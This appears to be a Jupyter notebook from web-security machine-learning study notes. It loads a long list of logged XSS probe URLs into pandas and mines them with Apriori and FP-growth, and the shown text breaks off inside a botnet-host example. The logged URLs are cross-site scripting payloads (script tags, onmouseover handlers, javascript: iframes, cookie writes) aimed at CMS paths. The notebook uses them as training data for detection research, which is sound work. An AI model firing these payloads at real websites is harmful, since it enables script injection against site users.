# /144/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /144/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
#
# /144/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
#
# /144/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
#
# /144/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /144/index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
#
# /144/index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
#
# /144/index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
#
# /144/index.php?product-%22%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20-1122-viewpic.html
#
# /144/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /144/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /144/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /144/?product-75-1@%7C1122%22%3E%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%20-index.html
#
# /144/resume/?key=xxxx%bf%22;alert(360);//
#
# /144/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /144/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /144/styles/outlook1/tools/calendar/calEditEvent.php?action=edit%22%3E%3Cscript%3Ealert(42873)%3C/script%3Ebad=%22&calid=
#
# /144/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /144/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# ...
#
# /7/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /7/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
#
# /7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
#
# /7/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
#
# /7/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /7/index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
#
# /7/index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
#
# /7/index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
#
# /7/manage/Zone/TemplateList.aspx?OpenerText=a');%7Dalert(42873);%7B//
#
# /7/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /7/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /7/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /7/report/reportServlet?action=4&url=http://127.0.0.1&file=wait_trace.raq&columns=0&srcType=file&width=-1&height=-1&cachedId=A_2&t_i_m_e=&frame=stu_saveAs_frame--%3E%3C/sCrIpT%3E%3CsCrIpT%3Ealert(42873)%3C/sCrIpT%3E
#
# /7/resume/?key=xxxx%bf%22;alert(360);//
#
# /7/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /7/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /7/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /7/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /7/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /7vnkuo63.asp?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.aspx?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.cfc?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.cfm?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.cgi?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.dll?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.do?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.exe?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.fts?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.html?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.htm?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.idc?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.jspa?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.jsp?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.kspx?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.mscgi?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.nsf?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.php3?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.php?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.pl?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7vnkuo63.x?<script>document.cookie=%22testftwc=7501;%22</script>
#
# /7/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /7/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /80/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /80/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /80/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /80/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /80/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /80/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /80/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /80/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /80/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /80/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /80/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /80/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /80/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /80/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /80/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /80/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /80/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /80/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /80/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /80/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /80/resume/?key=xxxx%bf%22;alert(360);//
#
# /80/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /80/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /80/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /80/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /80/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /80/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /8/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /?8338=123%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8338=%20onchange=alert(1)
#
# /?8338='%20onchange=alert(1)%20a'
#
# /?8338=%22%20onchange=alert(1)%20a%22
#
# /?8338=%22'%3E%3Cbody%20id=ssltest%20title=alert(1)%20onload=eval(ssltest.title)%3E
#
# /?8338=%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8338=%22%3E%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8338='%22;alert(1);//
#
# /?8338=%22;alert(1);//
#
# /?8338=%22);alert(1);//
#
# /?8338=%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8338=%3Cscrip%3Cscript%3Et%3Ewindow.a==1?1:alert(1)%3C/scrip%3C/script%3Et%3E
#
# /?8338=%3C/script%3E%3Cscript%3Ealert(1);//
#
# /?8338=%3Cscript%3Econfirm(1)%3C/script%3E
#
# /?8338=%3C/textarea%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8338=--%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8338=%3E'%3E%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8338='%3E%5C';%3C/script%3E%3E%5C%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
#
# /?8338=%5Cx3cimg%20src=1%20onerror=alert(1)%5Cx3e
#
# /?8338=;alert(1);//
#
# /?8338=';alert(1);'
#
# /?8338=alert(1)
#
# /?8338=alert(1)//
#
# /?8338=javascript:alert(1)
#
# /?8350=123%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8350=%20onchange=alert(1)
#
# /?8350='%20onchange=alert(1)%20a'
#
# /?8350=%22%20onchange=alert(1)%20a%22
#
# /?8350=%22'%3E%3Cbody%20id=ssltest%20title=alert(1)%20onload=eval(ssltest.title)%3E
#
# /?8350=%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8350=%22%3E%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8350='%22;alert(1);//
#
# /?8350=%22;alert(1);//
#
# /?8350=%22);alert(1);//
#
# /?8350=%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8350=%3Cscrip%3Cscript%3Et%3Ewindow.a==1?1:alert(1)%3C/scrip%3C/script%3Et%3E
#
# /?8350=%3C/script%3E%3Cscript%3Ealert(1);//
#
# /?8350=%3Cscript%3Econfirm(1)%3C/script%3E
#
# /?8350=%3C/textarea%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8350=--%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8350=%3E'%3E%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8350='%3E%5C';%3C/script%3E%3E%5C%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
#
# /?8350=%5Cx3cimg%20src=1%20onerror=alert(1)%5Cx3e
#
# /?8350=;alert(1);//
#
# /?8350=';alert(1);'
#
# /?8350=alert(1)
#
# /?8350=alert(1)//
#
# /?8350=javascript:alert(1)
#
# /?8351=123%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8351=%20onchange=alert(1)
#
# /?8351='%20onchange=alert(1)%20a'
#
# /?8351=%22%20onchange=alert(1)%20a%22
#
# /?8351=%22'%3E%3Cbody%20id=ssltest%20title=alert(1)%20onload=eval(ssltest.title)%3E
#
# /?8351=%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8351=%22%3E%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8351='%22;alert(1);//
#
# /?8351=%22;alert(1);//
#
# /?8351=%22);alert(1);//
#
# /?8351=%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?8351=%3Cscrip%3Cscript%3Et%3Ewindow.a==1?1:alert(1)%3C/scrip%3C/script%3Et%3E
#
# /?8351=%3C/script%3E%3Cscript%3Ealert(1);//
#
# /?8351=%3Cscript%3Econfirm(1)%3C/script%3E
#
# /?8351=%3C/textarea%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8351=--%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8351=%3E'%3E%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?8351='%3E%5C';%3C/script%3E%3E%5C%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
#
# /?8351=%5Cx3cimg%20src=1%20onerror=alert(1)%5Cx3e
#
# /?8351=;alert(1);//
#
# /?8351=';alert(1);'
#
# /?8351=alert(1)
#
# /?8351=alert(1)//
#
# /?8351=javascript:alert(1)
#
# /8/8250/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /8/8250/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=...%3E
#
# /8/8250/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /8/8250/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /8/8250/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /8/8250/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /8/8250/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /8/8250/api.php?op=video_api&pc_hash=test%22/%3Ec%3Cscscriptript%3Ealert(42873)%3C/scscriptript%3E&&do_complete=1&uid=1&snid=1
#
# /8/8250/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /8/8250/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /8/8250/cgi/index.cgi?error=badlogin&__mode=show_login%27%22%28%29%26%25%3CScRiPt%20%3Ealert%2842873%29%3C%2fScRiPt%3E
#
# /8/8250/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /8/8250/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /8/8250/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /8/8250/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /8/8250/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /8/8250/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /8/8250/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /8/8250/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /8/8250/forgetbf.asp?errstr=--%3E%3C/script%3E%3Cscript%3Ealert(42873)%3C/script%3E
#
# /8/8250/?gallery-1--1--'%20%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20'--grid.html
#
# /8/8250/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /8/8250/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /8/8250/index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /8/8250/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /8/8250/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /8/8250/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336

# %%
import pandas as pd

pd.DataFrame(myDat)
# Out:
#                0            1              2       3    \
# 0                   onmouseover                 prompt
# 1               op          map        maptype       1
# 2               op          map        maptype       1
# 3               op          map        maptype       1
# 4               op          map        maptype       1
# ...            ...          ...            ...     ...
# 1995  jsoncallback               iframe/onload   alert
# 1996             a        lists          agent       2
# 1997             a        lists          agent       2
# 1998             a        lists          agent
# 1999             a        lists          agent
#
#                          4                   5                       6    \
# 0                      42873                                         bad
# 1                       city                test                  script
# 2                defaultcity                 %e5
# 3                defaultcity  %E5%8C%97%E4%BA%AC                 api_key
# 4                defaultcity  %E5%8C%97%E4%BA%AC                   field
# ...                      ...                 ...                     ...
# 1995               /webscan/
# 1996  onmoonmouseoveruseover               alert                   42873
# 1997                                 onmouseover                   alert
# 1998                 bedroom               4_100  onmouonmouseoverseover
# 1999                 bedroom               4_100
#
#               7        8        9    ...   910   911   912   913   914   915  \
# 0                                    ...  None  None  None  None  None  None
# 1           alert  /42873/           ...  None  None  None  None  None  None
# 2           alert  /42873/           ...  None  None  None  None  None  None
# 3                                    ...  None  None  None  None  None  None
# 4                           /script  ...  None  None  None  None  None  None
# ...           ...      ...      ...  ...   ...   ...   ...   ...   ...   ...
# 1995                  None     None  ...  None  None  None  None  None  None
# 1996                     y           ...  None  None  None  None  None  None
# 1997        42873                 y  ...  None  None  None  None  None  None
# 1998        alert    42873           ...  None  None  None  None  None  None
# 1999  onmouseover    alert    42873  ...  None  None  None  None  None  None
#
#        916   917   918   919
# 0     None  None  None  None
# 1     None  None  None  None
# 2     None  None  None  None
# 3     None  None  None  None
# 4     None  None  None  None
# ...    ...   ...   ...   ...
# 1995  None  None  None  None
# 1996  None  None  None  None
# 1997  None  None  None  None
# 1998  None  None  None  None
# 1999  None  None  None  None
#
# [2000 rows x 920 columns]

# %%
L, suppData = apriori(myDat, 0.1)
rules = generateRules(L, suppData, minConf=0.99)
rules
# Out:
# ---------------------------------------------------------------------------
# KeyboardInterrupt                         Traceback (most recent call last)
# <ipython-input-43-feb591952bab> in <module>
# ----> 1 L, suppData = apriori(myDat, 0.1)
#       2 rules = generateRules(L, suppData, minConf=0.99)
#       3 rules
#
# d:\Documents\天池竞赛\WebSecMLLearnNote\Code\apriori.py in apriori(dataSet, minSupport)
#      45
#      46     while (len(L[k - 2]) > 0):
# ---> 47         Ck = aprioriGen(L[k - 2], k)
#      48         Lk, supK = scanD(D, Ck, minSupport)
#      49         suppData.update(supK)
#
# d:\Documents\天池竞赛\WebSecMLLearnNote\Code\apriori.py in aprioriGen(Lk, k)
#      30         for j in range(i + 1, lenLk):
#      31             L1 = list(Lk[i])[:k-2]
# ---> 32             L2 = list(Lk[j])[:k-2]
#      33             L1.sort()
#      34             L2.sort()
#
# KeyboardInterrupt:

# %%
L, suppData = apriori(myDat, 0.001)
rules = generateRules(L, suppData, minConf=0.99)
rules

# %% [markdown]
# # 11.5 示例：hello world！FP-growth

# %%
# %%cmd
#
# pip install pyfpgrowth
# Out:
# Microsoft Windows [�汾 10.0.22631.4460]
# (c) Microsoft Corporation����������Ȩ����
#
# (base) d:\Documents\��ؾ���\WebSecMLLearnNote\Code>
# (base) d:\Documents\��ؾ���\WebSecMLLearnNote\Code>pip install pyfpgrowth
# Collecting pyfpgrowth
#   Downloading pyfpgrowth-1.0.tar.gz (1.6 MB)
#      ---------------------------------------- 1.6/1.6 MB 110.7 kB/s eta 0:00:00
#   Preparing metadata (setup.py): started
#   Preparing metadata (setup.py): finished with status 'done'
# Building wheels for collected packages: pyfpgrowth
#   Building wheel for pyfpgrowth (setup.py): started
#   Building wheel for pyfpgrowth (setup.py): finished with status 'done'
#   Created wheel for pyfpgrowth: filename=pyfpgrowth-1.0-py2.py3-none-any.whl size=5488 sha256=eeabf3b99ceec634401011b8fc7f9d7b4d50f3a48e295d8eb9916e4a51996067
#   Stored in directory: c:\users\坂田银时\appdata\local\pip\cache\wheels\30\bd\27\bbd99f16e2a89737066af54b00f0d3c1219416c24bcb0b962a
# Successfully built pyfpgrowth
# Installing collected packages: pyfpgrowth
# Successfully installed pyfpgrowth-1.0
#
# (base) d:\Documents\��ؾ���\WebSecMLLearnNote\Code>
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)
# WARNING: Ignoring invalid distribution -atplotlib (d:\anaconda\lib\site-packages)

# %%
import pyfpgrowth

transactions = [[1, 2, 5],
                [2, 4],
                [2, 3],
                [1, 2, 4],
                [1, 3],
                [2, 3],
                [1, 3],
                [1, 2, 3, 5],
                [1, 2, 3]]

patterns = pyfpgrowth.find_frequent_patterns(transactions, 2)
rules = pyfpgrowth.generate_association_rules(patterns, 0.7)
rules

# %% [markdown]
# # 11.6 示例：使用FP-growth算法挖掘疑似僵尸主机

# %%
import pyfpgrowth


transactions=[]

with open("../Data/KnowledgeGraph/sample7.txt") as f:
    for line in f:
        line=line.strip('\n')
        ip,ua,target=line.split(',')
